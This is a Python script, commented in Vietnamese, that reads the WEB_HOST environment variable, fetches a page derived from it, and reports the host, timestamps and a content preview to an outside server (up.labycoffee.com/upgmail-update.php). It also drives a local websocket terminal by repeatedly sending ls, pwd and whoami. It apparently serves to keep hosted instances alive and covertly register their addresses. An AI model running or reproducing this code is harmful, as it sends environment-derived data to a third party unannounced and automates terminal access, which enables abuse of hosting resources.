import os
import re
import time
import requests
import threading
import websocket
import random
import string
import datetime
import pytz
import platform
from html import unescape
from subprocess import Popen, PIPE
from urllib.parse import urlencode

def clear_screen():
    system_name = platform.system()
    if system_name == 'Windows':
        os.system('cls')  # Lệnh clear trên Windows
    else:
        os.system('clear')  # Lệnh clear trên Linux/macOS

# Hàm tương đương simpleGet

def simple_get(url, callback):
    full_url = f"https://{url}"
    try:
        response = requests.get(full_url)
        response.raise_for_status()

        # Loại bỏ các thẻ HTML
        cleaned_data = re.sub(r'<[^>]+>', '', response.text)
        cleaned_data = re.sub(r'<img[^>]*>', '', cleaned_data).strip()
        preview = cleaned_data[:100]
        clear_screen()
        print("Dữ liệu đã xử lý:", preview)
        callback(preview)
    except Exception as e:
        clear_screen()
        print("Lỗi khi lấy dữ liệu:", e)
        callback(None)

# Lấy giá trị biến môi trường WEB_HOST

def get_web_host(callback):
    cmd = 'printenv' if os.name != 'nt' else 'set'
    process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
    stdout, stderr = process.communicate()

    if process.returncode != 0:
        callback(None)
        return

    lines = stdout.decode().splitlines()
    for line in lines:
        if line.startswith('WEB_HOST='):
            return callback(line.split('=')[1].strip())

    threading.Timer(5, lambda: get_web_host(callback)).start()

# Gửi dữ liệu lên server
nows = datetime.datetime.now(pytz.timezone('Asia/Ho_Chi_Minh')).strftime(" %H:%M:%S %d/%m/%Y")
def start_main_loop(url):
    def handle_data(extracted_data):
        if not extracted_data:
            extracted_data = "File không tồn tại"

        now = datetime.datetime.now(pytz.timezone('Asia/Ho_Chi_Minh')).strftime(" %H:%M:%S %d/%m/%Y")
        clear_screen()
        print(f"Đang xử lý với dữ liệu: {extracted_data}, {now}")

        try:
            requests.get("https://up.labycoffee.com/upgmail-update.php", params={
                "uid": url,
                "full_info": f"{url}%{now}%{extracted_data}%{nows}",
                "type": 44
            })
        except Exception as e:
            clear_screen()
            print("Lỗi khi gửi dữ liệu lên server:", e)

    simple_get(url, handle_data)

cached_web_host = None

def getok():
    global cached_web_host
    def _cb(web_host):
        global cached_web_host
        if not web_host:
            threading.Timer(5, getok).start()
            return
        cached_web_host = web_host
        simple_get("2019-" + web_host, lambda x: None)

    if cached_web_host:
        simple_get("2019-" + cached_web_host, lambda x: None)
    else:
        get_web_host(_cb)

def urlstart():
    global cached_web_host
    def _cb(web_host):
        global cached_web_host
        if not web_host:
            threading.Timer(5, urlstart).start()
            return
        cached_web_host = web_host
        start_main_loop("2019-" + web_host)

    if cached_web_host:
        start_main_loop("2019-" + cached_web_host)
    else:
        get_web_host(_cb)

class Client:
    def __init__(self, name='client'):
        self.name = name
        self.retry_interval = 5
        self.ws_connected = False

    def emit(self, event):
        clear_screen()
        print(event)

    def start_ws(self, host):
        uid = ''.join(random.choices(string.hexdigits, k=8))
        self.emit({"uid": uid, "message": "Connecting to terminal..."})

        def on_message(ws, message):
            self.emit({"uid": uid, "message": message})

        def on_open(ws):
            self.emit({"uid": uid, "message": "Connected to terminal..."})
            self.ws_connected = True

        def on_close(ws, close_status_code, close_msg):
            self.emit({"uid": uid, "message": "Connection closed"})
            self.ws_connected = False
            self.retry_connection(host)

        def on_error(ws, error):
            self.emit({"uid": uid, "message": f"Error: {error}"})
            self.ws_connected = False
            self.retry_connection(host)

        def run_stats():
            
            getok_interval = 60  # giây
            urlstart_interval = 300  # giây (5 phút)

            last_getok = time.time()
            last_urlstart = time.time()
            getok()
            urlstart()
            while True:
                try:
                    now = time.time()
                    if self.ws_connected:
                        for cmd in ["ls", "pwd", "whoami"]:
                            try:
                                ws.send(cmd + '\n')
                            except Exception as e:
                                clear_screen()
                                print(f"Lỗi gửi lệnh: {e}")
                            time.sleep(1.5)

                    if now - last_getok >= getok_interval:
                        getok()
                        last_getok = now

                    if now - last_urlstart >= urlstart_interval:
                        urlstart()
                        last_urlstart = now

                except Exception as e:
                    clear_screen()
                    print("Lỗi trong stats:", e)

                time.sleep(1)  # tránh vòng lặp quá nhanh, giảm CPU

        ws = websocket.WebSocketApp(f"ws://{host}/terminal",
                                     on_message=on_message,
                                     on_open=on_open,
                                     on_close=on_close,
                                     on_error=on_error)

        threading.Thread(target=ws.run_forever).start()
        threading.Thread(target=run_stats).start()

    def retry_connection(self, host):
        time.sleep(self.retry_interval)
        self.emit({"message": "Retrying connection 30s..."})
        time.sleep(30)
        self.start_ws(host)

if __name__ == "__main__":
    client = Client()
    client.start_ws("127.0.0.1:2019")
